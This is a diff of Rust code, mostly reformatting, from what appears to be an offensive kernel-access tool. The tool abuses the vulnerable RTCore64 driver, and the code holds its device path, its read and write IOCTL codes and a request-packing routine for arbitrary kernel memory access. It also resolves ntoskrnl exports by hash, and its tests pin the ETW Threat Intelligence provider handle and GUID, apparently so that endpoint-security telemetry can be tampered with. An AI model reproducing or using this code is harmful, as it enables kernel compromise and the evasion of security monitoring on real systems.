@@ -62,10 +62,18 @@ pub trait VulnDriverIoctl: Send + Sync {
     /// Pack a read/write request into the driver's input buffer. Default uses
     /// the generic [`RwPacket`]; drivers with a different layout override.
     fn pack(&self, code: u32, addr: u64, buf: *mut u8, size: u32) -> [u8; 32] {
-        let p = RwPacket { code, addr, size, buf: buf as u64 };
+        let p = RwPacket {
+            code,
+            addr,
+            size,
+            buf: buf as u64,
+        };
         let mut out = [0u8; 32];
         let bytes = unsafe {
-            core::slice::from_raw_parts(&p as *const RwPacket as *const u8, core::mem::size_of::<RwPacket>())
+            core::slice::from_raw_parts(
+                &p as *const RwPacket as *const u8,
+                core::mem::size_of::<RwPacket>(),
+            )
         };
         out[..bytes.len()].copy_from_slice(bytes);
         out
@@ -112,18 +120,31 @@ impl VulnDriverIoctl for RtCore64 {
         // → ERROR_FILE_NOT_FOUND (2). The device prefix is exactly `\\.\`
         // (4 chars: `\`, `\`, `.`, `\`), so the full path is 12 code units.
         static PATH: [u16; 12] = [
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16,
-            'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
+            '\\' as u16,
+            '\\' as u16,
+            '.' as u16,
+            '\\' as u16,
+            'R' as u16,
+            'T' as u16,
+            'C' as u16,
+            'o' as u16,
+            'r' as u16,
+            'e' as u16,
+            '6' as u16,
+            '4' as u16,
         ];
         &PATH
     }
     /// RTCore64 read IOCTL. **0x80002048** (the original code had this swapped
     /// with write — read was 0x8000204C, which is actually WRITE, so every read
     /// failed silently / corrupted the target).
-    fn read_ioctl(&self) -> u32 { 0x80002048 }
+    fn read_ioctl(&self) -> u32 {
+        0x80002048
+    }
     /// RTCore64 write IOCTL. **0x8000204C**.
-    fn write_ioctl(&self) -> u32 { 0x8000204C }
+    fn write_ioctl(&self) -> u32 {
+        0x8000204C
+    }
 }
 
 // ---- DeviceIoControl FFI (resolved by the operator host's kernel32) -------
@@ -198,7 +219,7 @@ impl ByovdDriver {
                 0xC0_00_00_00, // GENERIC_READ | GENERIC_WRITE
                 0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
                 ptr::null_mut(),
-                0x03,          // OPEN_EXISTING
+                0x03, // OPEN_EXISTING
                 0,
                 ptr::null_mut(),
             )
@@ -207,14 +228,19 @@ impl ByovdDriver {
             let gle = resolve_sym::<GetLastErrorFn>(b"kernel32.dll", b"GetLastError")
                 .map(|f| unsafe { f() })
                 .unwrap_or(0);
-            return Err(KrwError::Other(
-                alloc::format!("driver device open failed (Win32 err={})", gle),
-            ));
+            return Err(KrwError::Other(alloc::format!(
+                "driver device open failed (Win32 err={})",
+                gle
+            )));
         }
         // path_buf must outlive the handle usage within this function; the
         // device HANDLE is valid independently of the path buffer once opened,
         // so dropping path_buf here is fine.
-        Ok(Self { device: h, dioctl, driver })
+        Ok(Self {
+            device: h,
+            dioctl,
+            driver,
+        })
     }
 }
 
@@ -321,7 +347,9 @@ fn resolve_sym<T>(module: &[u8], name: &[u8]) -> Result<T, KrwError> {
 /// unavailable. The seam crate still compiles + mock tests run on the dev host.
 #[cfg(not(target_os = "windows"))]
 fn resolve_sym<T>(_module: &[u8], _name: &[u8]) -> Result<T, KrwError> {
-    Err(KrwError::Unavailable("resolver not bound in seam crate — operator binary supplies it"))
+    Err(KrwError::Unavailable(
+        "resolver not bound in seam crate — operator binary supplies it",
+    ))
 }
 
 // ---- Kernel symbol resolution (pure, testable) ----------------------------
@@ -371,7 +399,9 @@ pub fn resolve_kernel_symbol(ntoskrnl_image: &[u8], name: &[u8]) -> Option<u32> 
             if b == 0 {
                 break;
             }
-            h = h.wrapping_mul(33).wrapping_add((b as char).to_ascii_lowercase() as u32);
+            h = h
+                .wrapping_mul(33)
+                .wrapping_add((b as char).to_ascii_lowercase() as u32);
             p += 1;
         }
         if h == target_hash {
@@ -385,17 +415,28 @@ pub fn resolve_kernel_symbol(ntoskrnl_image: &[u8], name: &[u8]) -> Option<u32> 
 fn djb2(s: &[u8]) -> u32 {
     let mut h: u32 = 5381;
     for &b in s {
-        h = h.wrapping_mul(33).wrapping_add((b as char).to_ascii_lowercase() as u32);
+        h = h
+            .wrapping_mul(33)
+            .wrapping_add((b as char).to_ascii_lowercase() as u32);
     }
     h
 }
 fn read_u16_le(b: &[u8], off: usize) -> Option<u16> {
-    if off + 2 > b.len() { return None; }
+    if off + 2 > b.len() {
+        return None;
+    }
     Some(u16::from_le_bytes([b[off], b[off + 1]]))
 }
 fn read_u32_le(b: &[u8], off: usize) -> Option<u32> {
-    if off + 4 > b.len() { return None; }
-    Some(u32::from_le_bytes([b[off], b[off + 1], b[off + 2], b[off + 3]]))
+    if off + 4 > b.len() {
+        return None;
+    }
+    Some(u32::from_le_bytes([
+        b[off],
+        b[off + 1],
+        b[off + 2],
+        b[off + 3],
+    ]))
 }
 fn read_i32_le(b: &[u8], off: usize) -> Option<i32> {
     Some(read_u32_le(b, off)? as i32)
@@ -429,12 +470,12 @@ mod tests {
         img[0x220..0x224].copy_from_slice(&0x280u32.to_le_bytes()); // AddressOfNames
         img[0x224..0x228].copy_from_slice(&0x290u32.to_le_bytes()); // AddressOfNameOrdinals
         img[0x21C..0x220].copy_from_slice(&0x2A0u32.to_le_bytes()); // AddressOfFunctions
-        // name RVA @ 0x280 -> the string at 0x300
+                                                                    // name RVA @ 0x280 -> the string at 0x300
         img[0x280..0x284].copy_from_slice(&0x300u32.to_le_bytes());
         let sym = b"EtwThreatIntProvRegHandle";
         img[0x300..0x300 + sym.len()].copy_from_slice(sym);
         img[0x300 + sym.len()] = 0; // NUL
-        // ordinal @ 0x290 = 0
+                                    // ordinal @ 0x290 = 0
         img[0x290..0x292].copy_from_slice(&0u16.to_le_bytes());
         // function RVA @ 0x2A0 = 0xDEAD (the answer we expect)
         img[0x2A0..0x2A4].copy_from_slice(&0xDEADu32.to_le_bytes());
@@ -461,9 +502,18 @@ mod tests {
         assert_eq!(d.write_ioctl(), 0x8000204C);
         // \\.\RTCore64 — two leading backslashes (Win32 device namespace).
         let expected: &[u16] = &[
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16,
-            'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
+            '\\' as u16,
+            '\\' as u16,
+            '.' as u16,
+            '\\' as u16,
+            'R' as u16,
+            'T' as u16,
+            'C' as u16,
+            'o' as u16,
+            'r' as u16,
+            'e' as u16,
+            '6' as u16,
+            '4' as u16,
         ];
         assert_eq!(d.device_path(), expected);
     }
@@ -473,15 +523,17 @@ mod tests {
         // {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
         assert_eq!(
             ETW_TI_GUID_CHECK,
-            [0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
-             0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44]
+            [
+                0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D,
+                0xD3, 0x44
+            ]
         );
     }
 
     // Re-declare the GUID constant for the test (the real one is in etwti.rs;
     // here we just pin the expected bytes).
     const ETW_TI_GUID_CHECK: [u8; 16] = [
-        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
-        0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
+        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3,
+        0x44,
     ];
 }
